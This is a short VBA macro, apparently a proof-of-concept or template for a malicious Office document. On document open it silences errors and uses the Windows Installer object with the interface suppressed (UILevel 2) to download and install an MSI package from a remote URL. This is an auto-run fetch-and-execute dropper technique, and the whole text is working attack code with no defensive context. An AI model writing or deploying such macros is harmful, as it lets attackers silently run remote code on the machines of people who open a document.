Private Sub Document_Open()
On Error Resume Next
Dim msi As Object
Set msi = CreateObject("WindowsInstaller.Installer")
msi.UILevel = 2
' the second Property param may require some troubleshooting / testing https://docs.microsoft.com/en-us/windows/win32/msi/action
msi.InstallProduct "https://example.com/go.msi", ""
End Sub
